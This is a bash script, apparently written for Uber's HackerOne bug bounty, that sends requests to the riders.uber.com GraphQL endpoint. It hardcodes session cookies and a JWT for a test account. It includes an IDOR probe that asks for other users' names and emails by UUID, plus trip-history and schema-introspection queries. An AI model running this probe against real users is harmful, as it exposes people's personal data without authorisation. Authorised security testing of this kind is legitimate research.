#!/bin/bash
# Uber API Testing Script
# Uses captured session from Account A

set -e

# Session cookies (Account A)
COOKIES='sid=QA.CAESEA3khISa2UUXpXjiOrDR25gY69aF0QYiATEqJDBmOWFjNWVkLTQwYTAtNDVlOS1hOTdkLWE4MDI4Yzk1MzU2NjI8dO-MGaFMb9hgkWw5zpid5wfkZHA5y-kJV57c1R76RuaV21WMR8qyi1jW97nPtaRN7JCRFUd2mPjFzl95OgExQgh1YmVyLmNvbQ.24SXvZdKs0yCCBBXFTbQj_rJg67PRHj9kGJRcK9kKyY; jwt-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InNsYXRlLWV4cGlyZXMtYXQiOjE3NjUwMjYxOTQ5NzEsInRlbmFuY3kiOiJ1YmVyL3Byb2R1Y3Rpb24ifSwiaWF0IjoxNzY1MDI0Mzk0LCJleHAiOjE3NjUxMTA3OTR9.KpIz4jLGL2zcbyFxZbeyOqGZx-MGFTAg0yCc3MeDbAQ'

# User UUID (Account A - our test account)
USER_UUID="0f9ac5ed-40a0-45e9-a97d-a8028c953566"

# Headers
HEADERS=(
    -H "X-Bug-Bounty: HackerOne-aynorica"
    -H "x-csrf-token: x"
    -H "Content-Type: application/json"
    -H "Accept: application/json"
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

# GraphQL endpoint
GRAPHQL_URL="https://riders.uber.com/graphql"

# Function: Get current user profile
get_current_user() {
    echo "=== Getting Current User Profile ==="
    curl -s "${HEADERS[@]}" -b "$COOKIES" \
        -X POST "$GRAPHQL_URL" \
        -d '{"operationName":"CurrentUserRidersWeb","variables":{"includeDelegateProfiles":true,"includeUserMemberships":true,"useUberCashBalanceBreakdown":false},"query":"query CurrentUserRidersWeb($includeDelegateProfiles: Boolean = false, $includeUserMemberships: Boolean = false, $useUberCashBalanceBreakdown: Boolean = false) { currentUser { firstName lastName uuid email role tenancy pictureUrl rating } }"}' \
        | jq .
}

# Function: Test arbitrary UUID access (IDOR test)
test_user_by_uuid() {
    local target_uuid="$1"
    echo "=== Testing User UUID: $target_uuid ==="
    # Try to fetch user by UUID - this is a common IDOR pattern
    curl -s "${HEADERS[@]}" -b "$COOKIES" \
        -X POST "$GRAPHQL_URL" \
        -d "{\"operationName\":\"GetUserByUUID\",\"variables\":{\"uuid\":\"$target_uuid\"},\"query\":\"query GetUserByUUID(\$uuid: String!) { user(uuid: \$uuid) { firstName lastName email pictureUrl } }\"}" \
        | jq .
}

# Function: Get trip history
get_trips() {
    echo "=== Getting Trip History ==="
    curl -s "${HEADERS[@]}" -b "$COOKIES" \
        -X POST "$GRAPHQL_URL" \
        -d '{"operationName":"GetTrips","variables":{"limit":10},"query":"query GetTrips($limit: Int) { getTrips(first: $limit) { edges { node { uuid status beginTime endTime } } } }"}' \
        | jq .
}

# Function: Schema introspection (discover all queries)
introspect_schema() {
    echo "=== GraphQL Schema Introspection ==="
    curl -s "${HEADERS[@]}" -b "$COOKIES" \
        -X POST "$GRAPHQL_URL" \
        -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}' \
        | jq '.data.__schema.queryType.fields[] | {name, description}' 2>/dev/null || echo "Introspection may be disabled"
}

# Main
case "$1" in
    "me")
        get_current_user
        ;;
    "user")
        test_user_by_uuid "$2"
        ;;
    "trips")
        get_trips
        ;;
    "schema")
        introspect_schema
        ;;
    *)
        echo "Uber API Testing Script"
        echo ""
        echo "Usage: $0 <command> [args]"
        echo ""
        echo "Commands:"
        echo "  me        - Get current user profile"
        echo "  user UUID - Test IDOR with target UUID"
        echo "  trips     - Get trip history"
        echo "  schema    - Introspect GraphQL schema"
        echo ""
        echo "Current User UUID: $USER_UUID"
        ;;
esac
